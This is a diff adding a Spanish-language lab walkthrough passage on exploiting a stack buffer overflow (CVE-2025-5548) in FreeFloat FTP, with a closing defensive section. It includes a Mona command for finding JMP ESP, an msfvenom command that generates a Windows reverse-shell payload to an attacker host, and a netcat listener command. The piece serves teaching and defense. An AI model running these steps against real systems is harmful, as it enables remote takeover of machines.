@@ -54,5 +54,27 @@ Antes de inyectar código malicioso (*Shellcode*), debemos identificar qué cara
 Como la dirección de la pila (ESP) cambia constantemente, necesitamos encontrar una instrucción dentro del programa que diga "Salta a la pila" (`JMP ESP`). 
 
 Usamos Mona para buscar esta instrucción en un módulo del programa que no tenga protecciones modernas (como ASLR o DEP) y filtramos los *badchars* descubiertos:
-```text
+
 !mona jmp -r esp -cpb "\x00\x0a\x0d"
+
+Resultado: Encontramos una dirección de retorno válida. Al poner esta dirección en el EIP (escrita al revés por la arquitectura Little Endian), el programa saltará a nuestro código inyectado.
+
+Fase 6: Generación de la Carga (Payload) y Ejecución
+Llegamos a la fase final. Utilizamos Msfvenom para generar un Shellcode que nos proporcione una conexión inversa (Reverse Shell), asegurándonos de excluir los caracteres malos:
+
+Bash
+msfvenom -p windows/shell_reverse_tcp LHOST=[TU_IP_KALI] LPORT=4444 -b "\x00\x0a\x0d" -f c
+Integramos este código en nuestro script de Python, añadimos un "colchón" de instrucciones NOP (\x90 * 16) para dar margen a la memoria, y ponemos nuestro Netcat a la escucha (nc -nlvp 4444). Lanzamos el exploit final.
+
+📸 CAPTURA RECOMENDADA 4: La terminal de Kali Linux mostrando tu Netcat recibiendo la conexión, con el prompt C:\Windows\System32> confirmando el acceso total al sistema.
+
+🛡️ Conclusiones y Defensa
+Explotar el CVE-2025-5548 en un laboratorio nos enseña por qué las vulnerabilidades de corrupción de memoria son tan críticas.
+
+Para que un equipo de Blue Team pueda defenderse de ataques similares, se recomiendan las siguientes medidas:
+
+Compilación Segura: El software debe compilarse activando protecciones modernas del sistema operativo como ASLR (que aleatoriza las direcciones de memoria), DEP (que impide ejecutar código en la pila) y SafeSEH.
+
+Validación de Entradas: Sustituir funciones inseguras en C/C++ (como strcpy) por alternativas que limiten el tamaño del búfer (como strncpy).
+
+Gestión del Software Legado: Priorizar el parcheo, aislamiento en red o sustitución directa de servicios antiguos (como FreeFloat FTP) que ya no reciben soporte de seguridad.
